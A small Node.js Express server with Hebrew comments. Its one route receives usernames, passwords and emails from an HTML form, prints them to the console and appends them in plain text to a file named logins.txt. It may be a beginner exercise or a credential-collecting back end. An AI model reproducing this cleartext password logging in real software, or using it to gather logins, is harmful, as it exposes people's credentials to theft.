const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// חשוב מאוד: מאפשר לשרת לקרוא את הנתונים שנשלחים מה-HTML
app.use(express.json());
app.use(express.static('public'));

app.post('/save-data', (req, res) => {
    console.log("נתונים הגיעו לשרת:", req.body); // זה ידפיס בטרמינל שלך

    const { username, password, email } = req.body;
    const dataLine = `User: ${username} | Pass: ${password} | Email: ${email} | Date: ${new Date().toLocaleString()}\n`;

    // שמירה לקובץ
    fs.appendFile(path.join(__dirname, 'logins.txt'), dataLine, (err) => {
        if (err) {
            console.error("שגיאה בכתיבה:", err);
            return res.status(500).send("Error");
        }
        console.log("הנתונים נשמרו בתוך logins.txt!");
        res.json({ success: true });
    });
});

app.listen(3000, () => {
    console.log('השרת רץ בכתובת: http://localhost:3000');
});